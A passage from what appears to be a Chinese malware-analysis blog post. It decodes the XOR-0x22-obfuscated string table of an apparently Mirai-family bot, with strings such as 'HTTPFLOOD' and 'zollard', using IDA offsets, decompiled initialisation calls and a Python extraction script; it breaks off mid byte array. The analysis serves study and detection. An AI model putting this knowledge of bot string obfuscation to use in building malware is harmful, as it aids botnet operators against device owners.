class="string">&quot;\x7E\x5A\x17\x1A\x7E\x5A\x16\x66\x7E\x5A\x16\x67\x7E\x5A\x16\x67\x7E\x5A\x16\x11\x7E\x5A\x17\x12\x7E\x5A\x16\x14\x7E\x5A\x10\x10\x22&quot;</span>, </span><br><span class="line"><span class="string">&quot;\x58\x4D\x4E\x4E\x43\x50\x46\x22&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> cipher:</span><br><span class="line">str_tmp = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> __ <span class="keyword">in</span> _:</span><br><span class="line">char = <span class="built_in">chr</span>(<span class="built_in">ord</span>(__) ^ <span class="number">0x22</span>)</span><br><span class="line"><span class="keyword">if</span> char == <span class="string">&quot;\0&quot;</span>:</span><br><span class="line">char = <span class="string">&quot;\\x00&quot;</span></span><br><span class="line">str_tmp = str_tmp + char</span><br><span class="line">print(str_tmp)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">REPORT %s:%s\x00</span></span><br><span class="line"><span class="string">HTTPFLOOD\x00</span></span><br><span class="line"><span class="string">LOLNOGTFO\x00</span></span><br><span class="line"><span class="string">\x58\x4D\x4E\x4E\x43\x50\x46\x22\x00</span></span><br><span class="line"><span class="string">zollard\x00</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>所以这个就和之前的分析报告对得上了，那本地的样本特征又该咋整呢？</p><h1 id="ida"><a class="markdownIt-Anchor" href="#ida"></a> ida</h1><p>strings窗口找字符串<br />找到一些看起来是加密的数据<br />程序初始内存为<code>0x08048000</code>，数据存储开始于<code>0x08058C60</code>，偏移量为<code>0x010c60</code>，数据存储结束于<code>0x08059637</code>，数据长度为<code>0x09d8</code><br />取出数据异或<code>0x22</code>得到明文<br />那么问题来了，这玩意该怎么和表中的每一项数据对应起来</p><p>函数<code>sub_8054D10</code>调用了这部分数据<br />取数据的下标和长度，对解密的字符串进行拆分即可<br />脚本如下</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br></pre></td><td class="code"><pre><span class="line">raw = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">sub_8055CA0(v0, asc_8058C60, 2);</span></span><br><span class="line"><span class="string">dword_805A1C0 = (int)v0;</span></span><br><span class="line"><span class="string">word_805A1C4 = 2;</span></span><br><span class="line"><span class="string">v1 = sub_8056AC4(0xCu);</span></span><br><span class="line"><span class="string">sub_8055CA0(v1, &amp;asc_8058C60[3], 12);</span></span><br><span class="line"><span class="string">dword_805A1B8 = (int)v1;</span></span><br><span class="line"><span class="string">word_805A1BC = 12;</span></span><br><span class="line"><span class="string">v2 = sub_8056AC4(2u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v2, &amp;asc_8058C60[16], 2);</span></span><br><span class="line"><span class="string">dword_805A300 = (int)v2;</span></span><br><span class="line"><span class="string">word_805A304 = 2;</span></span><br><span class="line"><span class="string">v3 = sub_8056AC4(0x1Du);</span></span><br><span class="line"><span class="string">sub_8055CA0(v3, &amp;asc_8058C60[19], 29);</span></span><br><span class="line"><span class="string">dword_805A1B0 = (int)v3;</span></span><br><span class="line"><span class="string">word_805A1B4 = 29;</span></span><br><span class="line"><span class="string">v4 = sub_8056AC4(7u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v4, &amp;asc_8058C60[35], 7);</span></span><br><span class="line"><span class="string">dword_805A1D0 = (int)v4;</span></span><br><span class="line"><span class="string">word_805A1D4 = 7;</span></span><br><span class="line"><span class="string">v5 = sub_8056AC4(5u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v5, &amp;asc_8058C60[43], 5);</span></span><br><span class="line"><span class="string">dword_805A1D8 = (int)v5;</span></span><br><span class="line"><span class="string">word_805A1DC = 5;</span></span><br><span class="line"><span class="string">v6 = sub_8056AC4(0xBu);</span></span><br><span class="line"><span class="string">sub_8055CA0(v6, &amp;asc_8058C60[49], 11);</span></span><br><span class="line"><span class="string">dword_805A1E0 = (int)v6;</span></span><br><span class="line"><span class="string">word_805A1E4 = 11;</span></span><br><span class="line"><span class="string">v7 = sub_8056AC4(4u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v7, &amp;asc_8058C60[61], 4);</span></span><br><span class="line"><span class="string">dword_805A1E8 = (int)v7;</span></span><br><span class="line"><span class="string">word_805A1EC = 4;</span></span><br><span class="line"><span class="string">v8 = sub_8056AC4(7u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v8, &amp;asc_8058C60[66], 7);</span></span><br><span class="line"><span class="string">dword_805A1F0 = (int)v8;</span></span><br><span class="line"><span class="string">word_805A1F4 = 7;</span></span><br><span class="line"><span class="string">v9 = sub_8056AC4(8u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v9, &amp;asc_8058C60[74], 8);</span></span><br><span class="line"><span class="string">dword_805A1F8 = (int)v9;</span></span><br><span class="line"><span class="string">word_805A1FC = 8;</span></span><br><span class="line"><span class="string">v10 = sub_8056AC4(0xAu);</span></span><br><span class="line"><span class="string">sub_8055CA0(v10, &amp;asc_8058C60[83], 10);</span></span><br><span class="line"><span class="string">dword_805A200 = (int)v10;</span></span><br><span class="line"><span class="string">word_805A204 = 10;</span></span><br><span class="line"><span class="string">v11 = sub_8056AC4(0xBu);</span></span><br><span class="line"><span class="string">sub_8055CA0(v11, &amp;asc_8058C60[94], 11);</span></span><br><span class="line"><span class="string">dword_805A208 = (int)v11;</span></span><br><span class="line"><span class="string">word_805A20C = 11;</span></span><br><span class="line"><span class="string">v12 = sub_8056AC4(0xFu);</span></span><br><span class="line"><span class="string">sub_8055CA0(v12, &amp;asc_8058C60[106], 15);</span></span><br><span class="line"><span class="string">dword_805A210 = (int)v12;</span></span><br><span class="line"><span class="string">word_805A214 = 15;</span></span><br><span class="line"><span class="string">v13 = sub_8056AC4(0x10u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v13, &amp;asc_8058C60[122], 16);</span></span><br><span class="line"><span class="string">dword_805A218 = (int)v13;</span></span><br><span class="line"><span class="string">word_805A21C = 16;</span></span><br><span class="line"><span class="string">v14 = sub_8056AC4(0xEu);</span></span><br><span class="line"><span class="string">sub_8055CA0(v14, &amp;asc_8058C60[139], 14);</span></span><br><span class="line"><span class="string">dword_805A220 = (int)v14;</span></span><br><span class="line"><span class="string">word_805A224 = 14;</span></span><br><span class="line"><span class="string">v15 = sub_8056AC4(0xBu);</span></span><br><span class="line"><span class="string">sub_8055CA0(v15, &amp;asc_8058C60[154], 11);</span></span><br><span class="line"><span class="string">dword_805A228 = (int)v15;</span></span><br><span class="line"><span class="string">word_805A22C = 11;</span></span><br><span class="line"><span class="string">v16 = sub_8056AC4(5u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v16, &amp;asc_8058C60[166], 5);</span></span><br><span class="line"><span class="string">dword_805A230 = (int)v16;</span></span><br><span class="line"><span class="string">word_805A234 = 5;</span></span><br><span class="line"><span class="string">v17 = sub_8056AC4(5u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v17, &amp;asc_8058C60[172], 5);</span></span><br><span class="line"><span class="string">dword_805A238 = (int)v17;</span></span><br><span class="line"><span class="string">word_805A23C = 5;</span></span><br><span class="line"><span class="string">v18 = sub_8056AC4(0x10u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v18, &amp;asc_8058C60[178], 16);</span></span><br><span class="line"><span class="string">dword_805A250 = (int)v18;</span></span><br><span class="line"><span class="string">word_805A254 = 16;</span></span><br><span class="line"><span class="string">v19 = sub_8056AC4(0xEu);</span></span><br><span class="line"><span class="string">sub_8055CA0(v19, &amp;asc_8058C60[195], 14);</span></span><br><span class="line"><span class="string">dword_805A258 = (int)v19;</span></span><br><span class="line"><span class="string">word_805A25C = 14;</span></span><br><span class="line"><span class="string">v20 = sub_8056AC4(9u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v20, &amp;asc_8058C60[210], 9);</span></span><br><span class="line"><span class="string">dword_805A260 = (int)v20;</span></span><br><span class="line"><span class="string">word_805A264 = 9;</span></span><br><span class="line"><span class="string">v21 = sub_8056AC4(0x13u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v21, &amp;asc_8058C60[220], 19);</span></span><br><span class="line"><span class="string">dword_805A268 = (int)v21;</span></span><br><span class="line"><span class="string">word_805A26C = 19;</span></span><br><span class="line"><span class="string">v22 = sub_8056AC4(0x17u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v22, &amp;asc_8058C60[240], 23);</span></span><br><span class="line"><span class="string">dword_805A270 = (int)v22;</span></span><br><span class="line"><span class="string">word_805A274 = 23;</span></span><br><span class="line"><span class="string">v23 = sub_8056AC4(0xEu);</span></span><br><span class="line"><span class="string">sub_8055CA0(v23, &amp;asc_8058C60[264], 14);</span></span><br><span class="line"><span class="string">dword_805A278 = (int)v23;</span></span><br><span class="line"><span class="string">word_805A27C = 14;</span></span><br><span class="line"><span class="string">v24 = sub_8056AC4(0x13u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v24, &amp;asc_8058C60[279], 19);</span></span><br><span class="line"><span class="string">dword_805A280 = (int)v24;</span></span><br><span class="line"><span class="string">word_805A284 = 19;</span></span><br><span class="line"><span class="string">v25 = sub_8056AC4(0x17u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v25, &amp;asc_8058C60[299], 23);</span></span><br><span class="line"><span class="string">dword_805A288 = (int)v25;</span></span><br><span class="line"><span class="string">word_805A28C = 23;</span></span><br><span class="line"><span class="string">v26 = sub_8056AC4(0xFu);</span></span><br><span class="line"><span class="string">sub_8055CA0(v26, &amp;asc_8058C60[323], 15);</span></span><br><span class="line"><span class="string">dword_805A290 = (int)v26;</span></span><br><span class="line"><span class="string">word_805A294 = 15;</span></span><br><span class="line"><span class="string">v27 = sub_8056AC4(8u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v27, &amp;asc_8058C60[339], 8);</span></span><br><span class="line"><span class="string">dword_805A298 = (int)v27;</span></span><br><span class="line"><span class="string">word_805A29C = 8;</span></span><br><span class="line"><span class="string">v28 = sub_8056AC4(0xBu);</span></span><br><span class="line"><span class="string">sub_8055CA0(v28, &amp;asc_8058C60[348], 11);</span></span><br><span class="line"><span class="string">dword_805A2A0 = (int)v28;</span></span><br><span class="line"><span class="string">word_805A2A4 = 11;</span></span><br><span class="line"><span class="string">v29 = sub_8056AC4(9u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v29, &amp;asc_8058C60[360], 9);</span></span><br><span class="line"><span class="string">dword_805A2A8 = (int)v29;</span></span><br><span class="line"><span class="string">word_805A2AC = 9;</span></span><br><span class="line"><span class="string">v30 = sub_8056AC4(6u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v30, &amp;asc_8058C60[370], 6);</span></span><br><span class="line"><span class="string">dword_805A2B0 = (int)v30;</span></span><br><span class="line"><span class="string">word_805A2B4 = 6;</span></span><br><span class="line"><span class="string">v31 = sub_8056AC4(5u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v31, &amp;asc_8058C60[377], 5);</span></span><br><span class="line"><span class="string">dword_805A2B8 = (int)v31;</span></span><br><span class="line"><span class="string">word_805A2BC = 5;</span></span><br><span class="line"><span class="string">v32 = sub_8056AC4(0xAu);</span></span><br><span class="line"><span class="string">sub_8055CA0(v32, &amp;asc_8058C60[383], 10);</span></span><br><span class="line"><span class="string">dword_805A2C8 = (int)v32;</span></span><br><span class="line"><span class="string">word_805A2CC = 10;</span></span><br><span class="line"><span class="string">v33 = sub_8056AC4(0xFu);</span></span><br><span class="line"><span class="string">sub_8055CA0(v33, &amp;asc_8058C60[394], 15);</span></span><br><span class="line"><span class="string">dword_805A2D0 = (int)v33;</span></span><br><span class="line"><span class="string">word_805A2D4 = 15;</span></span><br><span class="line"><span class="string">v34 = sub_8056AC4(0xAu);</span></span><br><span class="line"><span class="string">sub_8055CA0(v34, &amp;asc_8058C60[411], 10);</span></span><br><span class="line"><span class="string">dword_805A2D8 = (int)v34;</span></span><br><span class="line"><span class="string">word_805A2DC = 10;</span></span><br><span class="line"><span class="string">v35 = sub_8056AC4(5u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v35, &amp;asc_8058C60[422], 5);</span></span><br><span class="line"><span class="string">dword_805A2E0 = (int)v35;</span></span><br><span class="line"><span class="string">word_805A2E4 = 5;</span></span><br><span class="line"><span class="string">v36 = sub_8056AC4(5u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v36, &amp;asc_8058C60[428], 5);</span></span><br><span class="line"><span class="string">dword_805A2E8 = (int)v36;</span></span><br><span class="line"><span class="string">word_805A2EC = 5;</span></span><br><span class="line"><span class="string">v37 = sub_8056AC4(5u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v37, &amp;asc_8058C60[434], 5);</span></span><br><span class="line"><span class="string">dword_805A2F0 = (int)v37;</span></span><br><span class="line"><span class="string">word_805A2F4 = 5;</span></span><br><span class="line"><span class="string">v38 = sub_8056AC4(6u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v38, &amp;asc_8058C60[440], 6);</span></span><br><span class="line"><span class="string">dword_805A308 = (int)v38;</span></span><br><span class="line"><span class="string">word_805A30C = 6;</span></span><br><span class="line"><span class="string">v39 = sub_8056AC4(7u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v39, &amp;asc_8058C60[447], 7);</span></span><br><span class="line"><span class="string">dword_805A310 = (int)v39;</span></span><br><span class="line"><span class="string">word_805A314 = 7;</span></span><br><span class="line"><span class="string">v40 = sub_8056AC4(7u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v40, &amp;asc_8058C60[455], 7);</span></span><br><span class="line"><span class="string">dword_805A318 = (int)v40;</span></span><br><span class="line"><span class="string">word_805A31C = 7;</span></span><br><span class="line"><span class="string">v41 = sub_8056AC4(3u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v41, &amp;asc_8058C60[463], 3);</span></span><br><span class="line"><span class="string">dword_805A320 = (int)v41;</span></span><br><span class="line"><span class="string">word_805A324 = 3;</span></span><br><span class="line"><span class="string">v42 = sub_8056AC4(0x12u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v42, &amp;asc_8058C60[467], 18);</span></span><br><span class="line"><span class="string">dword_805A328 = (int)v42;</span></span><br><span class="line"><span class="string">word_805A32C = 18;</span></span><br><span class="line"><span class="string">v43 = sub_8056AC4(0x17u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v43, &amp;asc_8058C60[486], 23);</span></span><br><span class="line"><span class="string">dword_805A330 = (int)v43;</span></span><br><span class="line"><span class="string">word_805A334 = 23;</span></span><br><span class="line"><span class="string">v44 = sub_8056AC4(9u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v44, &amp;asc_8058C60[510], 9);</span></span><br><span class="line"><span class="string">dword_805A338 = (int)v44;</span></span><br><span class="line"><span class="string">word_805A33C = 9;</span></span><br><span class="line"><span class="string">v45 = sub_8056AC4(0x10u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v45, &amp;asc_8058C60[520], 16);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">list1 = re.findall(<span class="string">&quot;asc_8058C60\[([\d]+)\]&quot;</span>, raw)</span><br><span class="line">list2 = re.findall(<span class="string">&quot;, (\d+)\);\n&quot;</span>, raw)</span><br><span class="line">list_tmp = [<span class="string">&quot;0&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> list1:</span><br><span class="line">list_tmp.append(_)</span><br><span class="line">list1 = list_tmp</span><br><span class="line"></span><br><span class="line">cipher1 = [</span><br><span class="line"><span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x55</span>, <span class="number">0x4A</span>, <span class="number">0x4B</span>, <span class="number">0x56</span>, <span class="number">0x47</span>, <span class="number">0x4A</span>, <span class="number">0x43</span>, </span><br><span class="line"><span class="number">0x56</span>, <span class="number">0x0C</span>, <span class="number">0x41</span>, <span class="number">0x44</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0xB7</span>, <span class="number">0x00</span>, <span class="number">0x4E</span>, </span><br><span class="line"><span class="number">0x58</span>, <span class="number">0x50</span>, <span class="number">0x46</span>, <span class="number">0x02</span>, <span class="number">0x41</span>, <span class="number">0x4D</span>, <span class="number">0x41</span>, <span class="number">0x49</span>, <span class="number">0x02</span>, <span class="number">0x44</span>, </span><br><span class="line"><span class="number">0x47</span>, <span class="number">0x51</span>, <span class="number">0x56</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, <span class="number">0x52</span>, <span class="number">0x50</span>, <span class="number">0x4D</span>, <span class="number">0x41</span>, </span><br><span class="line"><span class="number">0x0D</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, <span class="number">0x47</span>, <span class="number">0x5A</span>, <span class="number">0x47</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, </span><br><span class="line"><span class="number">0x0A</span>, <span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x4E</span>, <span class="number">0x47</span>, <span class="number">0x56</span>, <span class="number">0x47</span>, <span class="number">0x46</span>, <span class="number">0x0B</span>, <span class="number">0x22</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x0D</span>, <span class="number">0x44</span>, <span class="number">0x46</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0x43</span>, <span class="number">0x4C</span>, <span class="number">0x4B</span>, </span><br><span class="line"><span class="number">0x4F</span>, <span class="number">0x47</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, <span class="number">0x51</span>, <span class="number">0x56</span>, <span class="number">0x43</span>, <span class="number">0x56</span>, <span class="number">0x57</span>, </span><br><span class="line"><span class="number">0x51</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x46</span>, <span class="number">0x54</span>, <span class="number">0x50</span>, <span class="number">0x6A</span>, <span class="number">0x47</span>, <span class="number">0x4E</span>, <span class="number">0x52</span>, </span><br><span class="line"><span class="number">0x47</span>, <span class="number">0x50</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x6C</span>, <span class="number">0x4B</span>, <span class="number">0x65</span>, <span class="number">0x65</span>, <span class="number">0x47</span>, <span class="number">0x70</span>, </span><br><span class="line"><span class="number">0x14</span>, <span class="number">0x1B</span>, <span class="number">0x5A</span>, <span class="number">0x46</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x13</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x15</span>, </span><br><span class="line"><span class="number">0x71</span>, <span class="number">0x4D</span>, <span class="number">0x50</span>, <span class="number">0x43</span>, <span class="number">0x6E</span>, <span class="number">0x6D</span>, <span class="number">0x63</span>, <span class="number">0x66</span>, <span class="number">0x67</span>, <span class="number">0x70</span>, </span><br><span class="line"><span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x6C</span>, <span class="number">0x4B</span>, <span class="number">0x65</span>, <span class="number">0x65</span>, <span class="number">0x47</span>, <span class="number">0x70</span>, <span class="number">0x46</span>, <span class="number">0x12</span>, </span><br><span class="line"><span class="number">0x4C</span>, <span class="number">0x49</span>, <span class="number">0x51</span>, <span class="number">0x13</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x15</span>, <span class="number">0x22</span>, <span 